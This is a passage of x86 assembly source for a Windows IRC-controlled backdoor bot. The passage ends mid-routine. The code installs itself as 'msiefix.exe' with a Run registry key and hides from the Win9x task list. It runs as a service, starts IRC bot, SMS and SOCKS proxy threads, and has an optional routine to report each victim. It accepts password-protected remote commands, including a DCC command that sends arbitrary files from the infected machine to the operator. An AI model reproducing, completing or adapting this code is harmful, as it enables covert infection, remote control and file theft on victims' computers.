ima_on_win9x:
    sub esp, 200
    mov esi, esp
    
    push 200
    push esi
    @pushsz "%windir%\system\msiefix.exe"
    call ExpandEnvironmentStringsA
    
    sub esp, 300
    mov edi, esp
    
    push 300
    push edi
    push 0
    call GetModuleFileNameA
    
    push 1
    push esi
    push edi
    call CopyFileA
    add esp, 300

    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <key_handle    dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_SET_VALUE
    push eax
    push eax
    push eax
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push HKEY_LOCAL_MACHINE
    call RegCreateKeyExA

    push esi
    call lstrlen
    
    push eax
    push esi
    push REG_SZ
    push 0
    @pushsz "MSIEFix"
    mov ebx, dword ptr [key_handle]
    push ebx
    call RegSetValueExA
    
    push ebx
    call RegCloseKey

    add esp, 200

    @pushsz "MSIEFixMutex"
    push 1
    push 0
    call CreateMutexA
    
    @pushsz "kernel32.dll"
    call GetModuleHandleA
    
    @pushsz "RegisterServiceProcess"
    push eax
    call GetProcAddress
    xchg eax, ecx
    jecxz ima_on_win9x_next
    
    push 1
    push 0
    call ecx
    
ima_on_win9x_next:
    jmp inet_thread

get_fcz_address:
    lea esi, [fc_import]
    
get_fcz_address_main_loop:
    mov eax, dword ptr [esi]
    inc eax
    jz get_fcz_address_end
    
    push esi
    call GetModuleHandleA
    xchg eax, ecx
    jecxz get_fcz_address_error
    
    xchg edi, ecx
    
    push esi
    call lstrlen
    inc eax
    
    add esi, eax
    
    mov ebp, dword ptr [esi]
    add esi, 4
    
get_fcz_address_loop:
    push esi
    push edi
    call GetProcAddress
    xchg eax, ecx
    jecxz get_fcz_address_error
    
    xchg ecx, ebx
    
    push esi
    call lstrlen
    inc eax
    
    add esi, eax
    mov dword ptr [esi], ebx
    
    add esi, 4
    
    dec ebp
    jnz get_fcz_address_loop
    jmp get_fcz_address_main_loop

get_fcz_address_end:
    clc
    retn
get_fcz_address_error:
    stc
    retn

service_main    proc    argc:DWORD, argv:DWORD
    local ss_handle:DWORD
    local CompKey:DWORD
    local Control:DWORD
    local Pipe:DWORD
    local Mutex:DWORD
    local overlapped:OVERLAPPED
    local _ss_:SERVICE_STATUS

    push 0
    push CK_PIPE
    push 0
    push -1
    call CreateIoCompletionPort
    mov dword ptr [hIOCP], eax

    push offset service_handler
    push offset service_name
    call RegisterServiceCtrlHandlerA
    mov dword ptr [ss_handle], eax

    mov dword ptr [_ss_.SS_ServiceType], SERVICE_WIN32_OWN_PROCESS
    mov dword ptr [_ss_.SS_ControlsAccepted], SERVICE_ACCEPT_SHUTDOWN
    
    xor eax, eax
    mov dword ptr [CompKey], eax
    mov dword ptr [Control], eax    ; SERVICE_CONTROL_RUN
    
    .repeat
        .if dword ptr [CompKey]==CK_SERVICE_CONTROL
            xor eax, eax
            mov dword ptr [_ss_.SS_Win32ExitCode], eax
            mov dword ptr [_ss_.SS_ServiceSpecificExitCode], eax
            mov dword ptr [_ss_.SS_CheckPoint], eax
            mov dword ptr [_ss_.SS_WaitHint], eax
            .if dword ptr [Control]==SERVICE_CONTROL_INTERROGATE
                lea eax, [_ss_]
                push eax
                push dword ptr [ss_handle]
                call SetServiceStatus
                jmp wait_for_io_port
            .endif
            
            mov eax, dword ptr [Control]
            mov eax, dword ptr [service_ctrl_to_pend+eax*4]
            .if eax!=0
                mov dword ptr [_ss_.SS_CurrentState], eax
                push 0
                pop dword ptr [_ss_.SS_CheckPoint]
                mov dword ptr [_ss_.SS_WaitHint], 500
                lea eax, [_ss_]
                push eax
                push dword ptr [ss_handle]
                call SetServiceStatus
            .endif
            
            .if dword ptr [Control]==SERVICE_CONTROL_RUN
            
                mov eax, offset inet_thread
                call Create_Thread
                
                push eax
                call CloseHandle
            
                @pushsz "MSIEFixMutex"
                push 1
                push 0
                call CreateMutexA
                
                mov dword ptr [Mutex], eax
            
                push 0
                push 1000
                push pipe_send_size ; I/O buffer size
                push pipe_send_size
                push 1
                push PIPE_TYPE_BYTE
                push PIPE_ACCESS_OUTBOUND or FILE_FLAG_OVERLAPPED
                @pushsz "\\.\pipe\MSIEFixPipe"
                call CreateNamedPipeA
                
                mov dword ptr [Pipe], eax
                
                push 0
                push CK_PIPE
                push dword ptr [hIOCP]
                push eax
                call CreateIoCompletionPort

                lea edi, [overlapped]
                xor eax, eax
                mov ecx, type(OVERLAPPED)/4
                rep stosd
                
                lea eax, [overlapped]
                push eax
                push dword ptr [Pipe]
                call ConnectNamedPipe
            
            .endif
            .if dword ptr [Control]==SERVICE_CONTROL_SHUTDOWN
                push dword ptr [Pipe]
                call CloseHandle
                push dword ptr [Mutex]
                call CloseHandle
            .endif
        .endif

        mov eax, dword ptr [_ss_.SS_CurrentState]
        mov eax, dword ptr [service_pend_to_state+eax*4]
        .if eax!=0
            mov dword ptr [_ss_.SS_CurrentState], eax
            xor eax, eax
            mov dword ptr [_ss_.SS_CheckPoint], eax
            mov dword ptr [_ss_.SS_WaitHint], eax
            lea eax, [_ss_]
            push eax
            push dword ptr [ss_handle]
            call SetServiceStatus
        .endif
        
        .if dword ptr [CompKey]==CK_PIPE
            push 0
            @pushvar <dd    ?>
            push pipe_send_size
            push offset pipe_send
            push dword ptr [Pipe]
            call WriteFile
            
            push dword ptr [Pipe]
            call FlushFileBuffers
            
            push dword ptr [Pipe]
            call DisconnectNamedPipe
            
            lea edi, [overlapped]
            xor eax, eax
            mov ecx, type(OVERLAPPED)/4
            rep stosd
                
            lea eax, [overlapped]
            push eax
            push dword ptr [Pipe]
            call ConnectNamedPipe
            
        .endif

wait_for_io_port:
        .if dword ptr [_ss_.SS_CurrentState]!=SERVICE_STOPPED
            lea eax, [CompKey]
            push INFINITE
            @pushvar <dd    ?>
            push eax
            @pushvar <bytes_transfered  dd  ?>
            push dword ptr [hIOCP]
            call GetQueuedCompletionStatus
    
            push dword ptr [bytes_transfered]
            pop dword ptr [Control]

        .endif
        
    .until dword ptr [_ss_.SS_CurrentState]==SERVICE_STOPPED
    
    leave
    retn 8
service_main    endp

service_handler proc    control:DWORD
    push 0
    push CK_SERVICE_CONTROL
    push dword ptr [control]
    push dword ptr [hIOCP]
    call PostQueuedCompletionStatus
    leave
    retn 4
service_handler endp

inet_thread_wait:
    push 1000
    call Sleep
inet_thread:
    call is_online
        jecxz inet_thread_wait
    mov dword ptr [online_flag], 1

    xor eax, eax
    push eax
    push eax
    push eax
    call HeapCreate
    test eax, eax
    jz inet_thread_end

    mov dword ptr [heap_handle], eax

    sub esp, 1000h
    push esp
    push 1
    call WSAStartup
    add esp,1000h
    test eax, eax
    jnz inet_thread_end

IFNDEF  email
    mov eax, offset ircbot_thread
    call Create_Thread
    mov dword ptr [inet_threadz], eax
ELSE
    mov eax, offset pop3_gateway
    call Create_Thread
    mov dword ptr [inet_threadz], eax
ENDIF

    mov eax, offset sms_thread
    call Create_Thread
    mov dword ptr [inet_threadz+4], eax

    mov eax, offset soxz_proxy
    call Create_Thread
    mov dword ptr [inet_threadz+8], eax

IFDEF   _send_notice_
        call send_notice            ; notice about victim ...
ENDIF

inet_thread_online_loop:
    push 1000
    call Sleep

    call is_online
    jecxz inet_thread_not_online
    jmp inet_thread_online_loop

inet_thread_not_online:
    and dword ptr [online_flag], 0

    push 20000
    push 1
    push offset inet_threadz
    push INET_THREADZ_COUNT
    call WaitForMultipleObjects
    inc eax
    cmp eax, WAIT_TIMEOUT
    jnz inet_threadz_close_handles

    lea esi, [inet_threadz]
    push INET_THREADZ_COUNT
    pop ecx
    
inet_threadz_terminate_loop:
    push ecx
    
    push 0
    push dword ptr [esi]
    call TerminateThread
    
    pop ecx
    
    add esi, 4
    loop inet_threadz_terminate_loop

inet_threadz_close_handles:
    lea esi, [inet_threadz]
    push INET_THREADZ_COUNT
    pop ecx
    
inet_threadz_loop:
    push ecx

    push dword ptr [esi]
    call CloseHandle
    
    pop ecx
    
    add esi, 4
    loop inet_threadz_loop

    call WSACleanup
    
    push dword ptr [heap_handle]
    call HeapDestroy

    jmp inet_thread
inet_thread_end:
    push 0
    call ExitThread

is_online:
    sub esp, 500
    mov edi, esp
    push 0
    mov eax, esp
    push 500
    mov edx, esp
    
    mov dword ptr [edi], 412    ; type(RASCONN)
    push eax
    push edx
    push edi
    call RasEnumConnectionsA
    
    mov edi, dword ptr [edi+4]

    pop eax 
    pop eax
    xchg eax, ecx
    jecxz is_online_nope
    
    sub esp, 200
    mov esi, esp
    mov dword ptr [esi], 160    ;type(RASCONNSTATUSA)
    
    push esi
    push edi
    call RasGetConnectStatusA

    xor ecx, ecx
    
    cmp dword ptr [esi.RCS_rasconnstate], RASCS_CONNECTED
    lahf
    add esp, 200
    sahf
    jnz is_online_nope
    
    inc ecx
    
is_online_nope:
    add esp, 500
    retn

ircbot_thread:
    @SEH_SetupFrame <jmp exit_ircbot_thread>
    call GetTickCount
    mov dword ptr [random_value], eax
    
    mov dword ptr [send_message], offset _send_message_
    mov dword ptr [is_user_allowed], offset _is_user_allowed_

IFDEF   log
    xor eax, eax
    push eax
    push eax
    push CREATE_ALWAYS
    push eax
    push FILE_SHARE_READ
    push GENERIC_WRITE
    @pushsz "ircbot.log"
    call CreateFileA
    inc eax
    jz exit_ircbot_thread
    
    dec eax
    mov dword ptr [log_handle], eax
ENDIF

    mov eax, 10000
    call heap_alloc
    mov dword ptr [buffer], eax
    mov dword ptr [in_buffer], eax

    mov eax, 512
    call heap_alloc
    mov dword ptr [str_buffer], eax

connect_to_server_:
    cmp dword ptr [online_flag], 1
    jnz end_close_socket
    call connect_to_server
    jc end_close_socket

    and dword ptr [bytes_read], 0
    
ircbot_main_loop:
    call get_message
    jc connect_to_server_
    call parse_message
    cmp dword ptr [online_flag], 1
    jnz end_close_socket
    call do_message
    jmp ircbot_main_loop

end_close_socket:
    push dword ptr [socket_handle]
    call closesocket
end_close_file:
IFDEF   log
    push dword ptr [log_handle]
    call CloseHandle
ENDIF
exit_ircbot_thread:
    @SEH_RemoveFrame
    push 0
    call ExitThread

connect_to_server:
    push dword ptr [socket_handle]
    call closesocket
    push 0
    push SOCK_STREAM
    push AF_INET
    call socket
    inc eax
    jz connect_to_server_error
    dec eax
    mov dword ptr [socket_handle], eax
try_server_again:
    mov eax, dword ptr [cur_server_name]
    lea eax, [eax*4+server_names]
    inc dword ptr [cur_server_name]
    mov esi, dword ptr [eax]
    or esi, esi
    jnz server_ok

    and dword ptr [cur_server_name], 0
    jmp try_server_again
    
server_ok:
    call get_hostent
    jz try_server_again

    lea edi, _sin_

    mov ebx, dword ptr [cur_server_name]
    dec ebx
    movzx ebx, word ptr [ebx*2+server_ports]
    call update_sin

    push type(sockaddr_in)
    push edi
    push dword ptr [socket_handle]
    call connect

    test eax, eax
    jnz try_server_again

    call get_local_host

    call generate_nick
    
    lea esi, [my_nick]
    call send_message
    
    lea esi, [my_user]
    call send_message
    
    clc
    retn
connect_to_server_error:
    stc
    retn

; in: esi - pointer to ip address
;     edi - where to store inet_addr
get_hostent:
    movzx eax, byte ptr [esi]
    push eax
    call isalpha
    add esp, 4
    
    xchg eax, ecx
    jecxz get_hostent_its_ivp4
    push esi
    call gethostbyname
    jmp get_hostent_end
get_hostent_its_ivp4:
    push esi
    call inet_addr
    sub esp, 4
    mov ebx, esp
    mov dword ptr [ebx], eax
    push AF_INET
    push 4
    push ebx
    call gethostbyaddr
    add esp, 4
get_hostent_end:
    test eax, eax
    retn

; in: edi - pointer to sockaddr_in struc
;     ebx - port number
;     eax - hostent
update_sin:
    xchg eax, esi
    add esi, h_addr

    push edi

    xor eax, eax

    push edi
    mov ecx, type(sockaddr_in)/4
    rep stosd
    
    pop edi
    
    movsw
    
    lodsw
    xchg eax, ecx
    
    inc edi
    inc edi

    mov eax, dword ptr [esi]
    mov esi, dword ptr [eax]
    
    rep movsb
    
    pop edi
    
    push edi
    
    lea edi, [edi.sin_port]
    push ebx
    call htons
    stosw
    
    pop edi
    retn


generate_nick:
    lea edi, [my_nick__]
    mov ecx, 9

generate_nick_loop:
    mov ebx, 56
    call get_random
    
    add al, 41h
    
    stosb
    
    dec ecx
    jnz generate_nick_loop
    retn
    
get_local_host:
    mov eax, 500
    call heap_alloc
    xchg eax, edi

    push 500
    push edi
    call gethostname
    
    push edi
    call gethostbyname
    
    xchg eax, ecx
    jecxz get_local_host_end

    mov ebx,[ecx+3*4]
    mov ebx,[ebx]
    mov ebx,[ebx]
    
    push ebx
    call htonl

    mov dword ptr [local_host_ip], eax

get_local_host_end:
    push edi
    call heap_free
        retn

; in: esi - ASCIIZ message
_send_message_:
    push 1000
    pop eax
    call heap_alloc
    mov dword ptr [temp_buffer], eax

    mov eax, 1500
    call heap_alloc
    xchg eax, edi
    
    push edi
    
    call find_replacementz
    
    mov eax, CR_LF
    stosw
    
    pop esi
    sub edi, esi

IFDEF   log
    push 0
    @pushvar <dd    ?>
    push edi
    push esi
    push dword ptr [log_handle]
    call WriteFile
ENDIF
    
    push 0
    push edi
    push esi
    push dword ptr [socket_handle]
    call send

    push esi
    call heap_free
    
    push dword ptr [temp_buffer]
    call heap_free

    retn

find_replacementz:
    lodsb
    test al, al
    jz find_replacementz_end
    
    cmp al, '$'
    jnz find_replacementz_next
    
    push eax
    
    push edi
    mov edi, dword ptr [temp_buffer]
    call move_until_gap
    pop edi
    
    lea ebx, [replacementz]
find_replacementz_loop:
    cmp dword ptr [ebx], 0
    jz find_replacementz_no

    add ebx, 8
    
    push dword ptr [temp_buffer]
    push dword ptr [ebx-8]
    call lstrcmpi
    test eax, eax
    jnz find_replacementz_loop

    push dword ptr [ebx-4]
    push edi
    call lstrcpy
    
    push dword ptr [ebx-4]
    call lstrlen
    add edi, eax
    
    pop eax

    jmp find_replacementz

find_replacementz_no:
    pop eax
    stosb
    push dword ptr [temp_buffer]
    push edi
    call lstrcpy
    
    push dword ptr [temp_buffer]
    call lstrlen
    add edi, eax

    jmp find_replacementz
find_replacementz_next:
    stosb
    jmp find_replacementz
    
find_replacementz_end:
    retn

move_until_gap:
    cmp byte ptr [esi], 0
    jz move_until_gap_end
    cmp byte ptr [esi], 20h
    jz move_until_gap_end
    jc move_until_gap_end
    movsb
    jmp move_until_gap
move_until_gap_end:
    xor eax, eax
    stosb
    retn

get_message:
    @SEH_SetupFrame <jmp get_message_error>
get_message_:
    mov ecx, dword ptr [bytes_read]
    jecxz read_from_server
    mov edi, dword ptr [cur_in_buffer]
    mov ebx, edi

get_message_loop:
    cmp word ptr [edi], CR_LF
    jz get_message_found_cr_lf
    
    inc edi
    dec ecx
    jecxz read_from_server

    jmp get_message_loop
    
get_message_found_cr_lf:
    inc edi
    inc edi
    
    sub edi, ebx
    mov dword ptr [bytes_read], ecx
    xchg edi, ecx
    xchg ebx, esi
    
    add dword ptr [cur_in_buffer], ecx
        
    push ecx

    mov dword ptr [cur_message_size], ecx
    mov edi, dword ptr [str_buffer]
    rep movsb

    pop ecx

IFDEF   log
    push 0
    @pushvar <dd    ?>
    push ecx
    push dword ptr [str_buffer]
    push dword ptr [log_handle]
    call WriteFile
ENDIF
    
    clc
    jmp get_message_error+1

read_from_server:
    push 0
    push 10000
    push dword ptr [in_buffer]
    push dword ptr [socket_handle]
    call recv
    inc eax
    jz get_message_error
    dec eax

    mov dword ptr [bytes_read], eax
    mov eax, dword ptr [in_buffer]
    mov dword ptr [cur_in_buffer], eax

    jmp get_message_
get_message_error:
    stc
    lahf
    @SEH_RemoveFrame
    sahf
    retn

parse_message:
    @SEH_SetupFrame <jmp parse_message_end>
    mov edi, dword ptr [str_buffer]
    and dword ptr [msg_command], 0
    
    cmp byte ptr [edi], ':'
    jnz parse_message_next
    
    inc edi
    
    mov dword ptr [msg_from], edi
    push edi
    mov eax, edi
    call go_until_gap
    inc edi
    sub edi, eax
    xchg edi, ecx
    pop edi
    
    mov eax, '!'
    repnz scasb
    jnz parse_message_no_nick
    
    and byte ptr [edi-1], 0
    
    call go_until_gap
    jc parse_message_end
    inc edi
    jmp parse_message_check
    
parse_message_no_nick:
    and byte ptr [edi-1], 0
parse_message_check:
    
    push dword ptr [msg_from]
    push dword ptr [_my_nick]
    call lstrcmpi
    xchg eax, ecx
    jecxz parse_message_end
    
parse_message_next:
    mov dword ptr [msg_command], edi
    call go_until_gap
    and byte ptr [edi], 0
    jc parse_message_end

    inc edi
    
    cmp byte ptr [edi], ':'
    jz parse_message_skip_to
    
    mov dword ptr [msg_to], edi
    call go_until_gap
    and byte ptr [edi], 0
    jc parse_message_end

    inc edi

parse_message_skip_to:
    call go_over_gapz
    jc parse_message_end
    mov dword ptr [msg_paramz], edi

    mov eax, 12345678h
cur_message_size    equ $-4

    mov edi, dword ptr [str_buffer]
    and byte ptr [edi+eax-2], 0

parse_message_end:
    @SEH_RemoveFrame
    retn

do_message:
    cmp dword ptr [msg_command], 0
    jz do_message_end

    lea ebx, [commandz]
do_message_loop:
    cmp dword ptr [ebx], 0
    jz do_message_end

    add ebx, 8
    
    push dword ptr [msg_command]
    push dword ptr [ebx-8]
    call lstrcmpi
    test eax, eax
    jnz do_message_loop

    call dword ptr [ebx-4]

do_message_end:
    retn

ping_fc:
    mov eax, dword ptr [msg_paramz]
    mov dword ptr [pong_reply], eax
    lea esi, [pong_command]
    call send_message
    retn
    

my_join_fc:
    lea esi, [invisible]
    call send_message
    lea esi, [my_join]
    call send_message
    lea esi, [key_channel]
    call send_message
    retn

privmsg_fc:
    xor ecx, ecx

    lea esi, [bot_commandz]
    mov edi, dword ptr [msg_paramz]
        call lower_case_bot_command
privmsg_fc_loop:
    mov cl, byte ptr [esi]
    jecxz privmsg_fc_end
        inc esi

    push edi
    push esi
    push ecx
    repz cmpsb
    pop ecx
    pop esi
    pop edi
    
    lahf
    add esi, ecx
    add esi, 4
    sahf
    jnz privmsg_fc_loop
    
    cmp ecx, ebx
    jnz privmsg_fc_loop

    add edi, ecx

    call dword ptr [esi-4]
    mov dword ptr [privmsg_what], offset all_iz_ok
    jnc privmsg_fc_no_error
    mov dword ptr [privmsg_what], offset error_
    
privmsg_fc_no_error:
    call message_for_who
    mov dword ptr [recipient], eax
    lea esi, [privmsg_msg]
    call send_message
privmsg_fc_end:
    retn

lower_case_bot_command:
    pushad
    push edi
    call go_over_gapz
    mov ecx, edi
    call go_until_gap
    mov ebx, edi
    mov al, byte ptr [edi]
    and byte ptr [edi], 0
    sub ebx, ecx
    mov esi, edi
    pop edi
    call lower_case
    mov edi, esi
        stosb
        cmp dword ptr [edi-4], " ccd"
        jnz $+5
        push 8
        pop ebx
        mov dword ptr [esp.Pushad_ebx], ebx
    popad
    retn

lower_case:
    pushad
lower_case_loop:
    mov al, byte ptr [edi]

        test al, al
    jz lower_case_end
    cmp al, 41h
    jc lower_case_go_on
    cmp al, 5ah
    ja lower_case_go_on

    add al, 20h

lower_case_go_on:
    stosb
    jmp lower_case_loop
lower_case_end:
    popad
    retn
    

nick_error_fc:
    call generate_nick
    lea esi, [my_nick]
    call send_message
    retn

get_random:
    push ecx
    push ebx
    mov eax, 12345678
random_value    equ $-4
    xor edx, edx
    mov ecx, 75abcd89h
    mul ecx
    inc eax
    mov ecx, 8ab88c8eh
    div ecx
    xchg eax, edx
    xor eax, edx
    mov dword ptr [random_value], eax
    xor edx, edx
    pop ebx
    div ebx
    xchg eax, edx
    pop ecx
    ret
    
go_over_gapz:
    cmp byte ptr [edi], 0
    stc
    jz go_over_gapz_end
    cmp byte ptr [edi], 0dh
    stc
    jz go_over_gapz_end
    cmp byte ptr [edi], ':'
    jz go_over_gapz_inc
    cmp byte ptr [edi], 20h
    jz go_over_gapz_inc
    jc go_over_gapz_inc
go_over_gapz_end:
    retn
go_over_gapz_inc:
    inc edi
    jmp go_over_gapz

go_over_all_gapz:
    cmp byte ptr [edi], 20h
    jbe go_over_all_gapz_inc
    retn
go_over_all_gapz_inc:
    inc edi
    jmp go_over_all_gapz

_message_for_who_:
    and dword ptr [to_flag], 0
    mov ebx, dword ptr [msg_from]
    push dword ptr [msg_to]
    push dword ptr [_my_nick]
    call lstrcmpi
    xchg eax, ecx
    jecxz message_for_who_end
    mov ebx, dword ptr [msg_to]
    mov dword ptr [to_flag], 1
message_for_who_end:
    xchg eax, ebx
    retn


bot_login_command:
    call go_over_gapz
    jc bot_login_command_end_error

    mov esi, edi
    push 0
    call gimme_CRC32
    
    cmp eax, dword ptr [bot_password]
    jnz bot_login_command_end_error

    push 1
    pop eax
    call is_user_allowed
    jnc bot_login_command_end_error
    push 1
    pop eax
    call add_oper
    jc bot_login_command_end_error
    
    clc
    retn
bot_login_command_end_error:
    stc
    retn
    
bot_logout_command:
    xor eax, eax
    call is_user_allowed
    jc bot_logout_command_end
    call remove_oper
bot_logout_command_end:
    retn

bot_reconnect_command:
    push 1
    pop eax
    call is_user_allowed
    jc bot_reconnect_command_end_error
    add esp, 12
    jmp connect_to_server_
bot_reconnect_command_end_error:
    retn
    
bot_quit_command:
    push 1
    pop eax
    call is_user_allowed
    jc bot_quit_command_end_error
    lea esi, [quit_message]
    call send_message
    add esp, 12
    jmp end_close_socket
bot_quit_command_end_error:
    retn

bot_opme_command:
    push 1
    pop eax
    call is_user_allowed
    jc bot_opme_command_end
    
    push dword ptr [channel]
    
    call go_over_gapz
    jc bot_opme_use_default
    
    mov dword ptr [channel], edi
    
bot_opme_use_default:
    mov eax, dword ptr [msg_from]
    mov dword ptr [op_who], eax
    
    lea esi, [op_message]
    call send_message
    
    pop dword ptr [channel]
    
    clc
bot_opme_command_end:
    retn

add_oper:
    mov byte ptr [add_oper_rites], al
    lea esi, dword ptr [operz]
    mov edi, esi
    lodsd
    inc eax
    cmp eax, MAX_ALLOWED_OPERZ
    ja add_oper_error
    stosd

add_oper_loop:
    mov edi, esi
    lodsd
    xchg eax, ecx
    jecxz add_oper_found_gap
    inc ecx
    jz add_oper_found_gap
    add esi, type(oper) - 4
    jmp add_oper_loop
    
add_oper_found_gap:
    push dword ptr [msg_from]
    call lstrlen
    inc eax
    call heap_alloc
    stosd

    push dword ptr [msg_from]
    push eax
    call lstrcpy
    
    mov al, 1
add_oper_rites  equ $-1
    stosb
    
    clc
    retn
add_oper_error:
    stc
    retn
    
remove_oper:
    lea esi, dword ptr [operz]
    lodsd
    xchg eax, ecx
    jecxz remove_oper_end_error
    
remove_oper_loop:
    lodsd
    test eax, eax
    jz remove_oper_loop_

    inc eax
    jz remove_oper_end_error
    dec eax

    push eax
    push dword ptr [msg_from]
    call lstrcmpi
    test eax, eax
    jz remove_oper_ok

remove_oper_loop_:
    add esi, type(oper) - 4
    
    dec ecx
    jnz remove_oper_loop
    jmp remove_oper_end_error

remove_oper_ok:
    push dword ptr [esi-4]
    call heap_free

    and dword ptr [esi-4], 0
    and byte ptr [esi], 0
    dec dword ptr [operz]

    clc
    retn
remove_oper_end_error:
    stc
    retn
    
_is_user_allowed_:
    mov byte ptr [user_rites], al
    lea esi, dword ptr [operz]
    lodsd
    xchg eax, ecx
    jecxz is_user_allowed_end_error
    
is_user_allowed_loop:
    lodsd
    test eax, eax
    jz is_user_allowed_go_on

    inc eax
    jz is_user_allowed_end_error
    dec eax

    push eax
    push dword ptr [msg_from]
    call lstrcmpi
    test eax, eax
    jnz is_user_allowed_go_on
    
    cmp byte ptr [esi], 1
user_rites  equ $-1
    jae is_user_allowed_ok

is_user_allowed_go_on:
    add esi, type(oper) - 4

    dec ecx
    jnz is_user_allowed_loop
    jmp is_user_allowed_end_error

is_user_allowed_ok:
    clc
    retn

is_user_allowed_end_error:
    stc
    retn

bot_redir_command:
    xor eax, eax
    call is_user_allowed
    jc bot_redir_command_error
    call go_over_gapz
    jc bot_redir_command_error
    xchg esi, edi
    call send_message
    clc
    jmp $+3
bot_redir_command_error:
    stc
    retn

bot_chg_pswd_command:
    push 1
    pop eax
    call is_user_allowed
    jc bot_chg_pswd_command_end_error

    call message_for_who
    cmp dword ptr [to_flag], 0
    jnz bot_chg_pswd_command_end_error

    call go_over_gapz
    jc bot_chg_pswd_command_end_error

    mov esi, edi
    push 0
    call gimme_CRC32

    mov dword ptr [bot_password], eax
    
    lea edx, [hu_subkey]
    mov ecx, dword ptr [default_settingz]
    push REG_DWORD
    pop ebx
    lea edi, [pswd_name]
    lea esi, [bot_password]
    call reg_set_value
    
    clc
    retn
bot_chg_pswd_command_end_error:
    stc
    retn
    

ping_command_:
    mov eax, dword ptr [msg_from]
    mov dword ptr [recipient], eax
    mov dword ptr [privmsg_what], offset dont_ping_me
    
    lea esi, [privmsg_msg]
    call send_message
    
    add esp, 8
    retn

go_until_gap:
    cmp byte ptr [edi], 0dh
    stc
    jz go_until_gap_end+1
    cmp byte ptr [edi], 0
    stc
    jz go_until_gap_end+1
    cmp byte ptr [edi], 20h
    jz go_until_gap_end
    jc go_until_gap_end
    inc edi
    jmp go_until_gap
go_until_gap_end:
    clc
    retn
    
send_command:
    call go_over_gapz
    jc send_command_error

    xor eax, eax
    call is_user_allowed
    jc send_command_error

    mov eax, 200
    call heap_alloc
    xchg eax, esi

    push esi
    
    xchg esi, edi
    call move_until_gap

    xchg esi, edi   
    call go_over_gapz
    xchg esi, edi
    call move_until_gap
    
    pop esi

    @pushvar <dd    ?>
    push 0
    push esi
    push offset dcc_send_thread
    push 8192
    push 0
    call CreateThread
    
    xchg eax, ecx
    jecxz send_command_error

    push ecx
    call CloseHandle
    
    clc
    retn
send_command_error:
    stc
    retn


dcc_send_thread proc    file_name:DWORD
    local file_handle:DWORD
    local bytes_2_send:DWORD
    local DCC_socket:DWORD
    local port:DWORD
    local DCC_sin:sockaddr_in
    local read_fds:fd_set
    local time_out:timeval

    xor eax, eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_READ
    push dword ptr [file_name]
    call CreateFileA
    inc eax
    jz dcc_send_thread_end
    
    dec eax
    mov dword ptr [file_handle], eax

    push 0
    push dword ptr [file_handle]
    call GetFileSize
    mov dword ptr [bytes_2_send], eax

    push 0
    push SOCK_STREAM
    push AF_INET
    call socket
    inc eax
    jz dcc_send_thread_end_close_file
    dec eax
    mov dword ptr [DCC_socket], eax
    
    mov dword ptr [DCC_sin.sin_family], AF_INET
    xor eax, eax
    lea edi, [DCC_sin.sin_zero]
    stosd
    stosd
    mov dword ptr [DCC_sin.sin_addr], eax
    
    mov ebx, 3976
    call get_random
    add eax, 1024
    mov dword ptr [port], eax
    
    push eax
    call htons
    mov word ptr [DCC_sin.sin_port], ax

    lea eax, [DCC_sin]
    push type(sockaddr_in)
    push eax
    push dword ptr [DCC_socket]
    call bind
    test eax, eax
    jnz dcc_send_thread_end_close_socket
    
synchronize_msg_sending:
    push 100
    call Sleep
    cmp dword ptr [syn_flag], 0
    jnz synchronize_msg_sending

    inc dword ptr [syn_flag]
    
    lea edi, [dcc_send_msg_]
    xor edx, edx
    push 10
    pop ecx
    
    mov eax, dword ptr [local_host_ip]
    call convert_num

    add edi, ebx
    mov al, 20h
    stosb
    
    push eax

    mov eax, dword ptr [port]
    call convert_num
    
    pop eax
    add edi, ebx
    stosb
    
    mov eax, dword ptr [bytes_2_send]
    call convert_num
    
    add edi, ebx
    mov ax, 01h
    stosw

    mov edi, dword ptr [file_name]
    mov dword ptr [dcc_file], edi

    call go_until_gap
    inc edi
    call go_over_gapz

    mov dword ptr [dcc_rcp], edi
    
    lea esi, [dcc_send_msg]
    call send_message

    dec dword ptr [syn_flag]
    
    push 3
    push dword ptr [DCC_socket]
    call listen
    test eax, eax
    jnz dcc_send_thread_end_close_socket

    lea ebx, [read_fds]
    mov dword ptr [ebx.fd_count], 1
    push dword ptr [DCC_socket]
    pop dword ptr [ebx.fd_array]

    lea ecx, [time_out]
    mov dword ptr [ecx.tv_sec], 50
    and dword ptr [ecx.tv_usec], 0
    
    xor eax, eax
    push ecx
    push eax
    push eax
    push ebx
    push eax
    call select
    xchg eax, ecx
    jecxz dcc_send_thread_end_close_socket
    inc ecx
    jz dcc_send_thread_end_close_socket

    push 0
    push 0
    push dword ptr [DCC_socket]
    call accept
    
    xchg eax, dword ptr [DCC_socket]
    
    push eax
    call closesocket    
    
    mov esi, 1000
    sub esp, esi
    mov ebx, esp
    
dcc_send_thread_loop:
    lea edi, [bytes_2_send]
    push 0
    push edi    
    push esi
    push ebx
    push dword ptr [file_handle]
    call ReadFile
    
    push 0
    push dword ptr [bytes_2_send]
    push ebx
    push dword ptr [DCC_socket]
    call send
    
    inc eax
    jz dcc_send_thread_end_close_socket
    
    cmp dword ptr [edi], esi
    jz dcc_send_thread_loop

    add esp, esi

    mov eax, 1000
    call online_sleep

dcc_send_thread_end_close_socket:
    push dword ptr [DCC_socket]
    call closesocket
dcc_send_thread_end_close_file:
    push dword ptr [file_handle]
    call CloseHandle
dcc_send_thread_end:
    push dword ptr [file_name]
    call heap_free
    leave
    push 0
    call ExitThread
dcc_send_thread endp

Convert_Digz    db  '0123456789ABCDEF'
convert_num:
    push edi
    push ecx
    push edx
    push ebp

    sub esp, 12
    mov ebp, esp

    cld
    mov esi, edi
    push esi

    xor ebx, ebx
    mov dword ptr [ebp], eax
    mov dword ptr [ebp+4], edx
    mov dword ptr [ebp+8], ebx
    mov esi, ebx

_convert_num:
    inc esi
    mov eax, dword ptr [ebp+4]
    xor edx, edx
    div ecx
    mov dword ptr [ebp+4], eax

    mov eax, dword ptr [ebp]
    div ecx

    mov dword ptr [ebp], eax

    mov bl, dl
    mov al, byte ptr [Convert_Digz+ebx]
    stosb

    inc dword ptr [ebp+8]
    
    cmp dword ptr [ebp], 0
    jnz _convert_num
    cmp dword ptr [ebp+4], 0
    jnz _convert_num

    pop ecx
    
    push esi
    
    xchg ecx, esi
    shr ecx, 1
    jz convert_num__

    xchg edi, esi
    sub esi, 1

convert_num_:
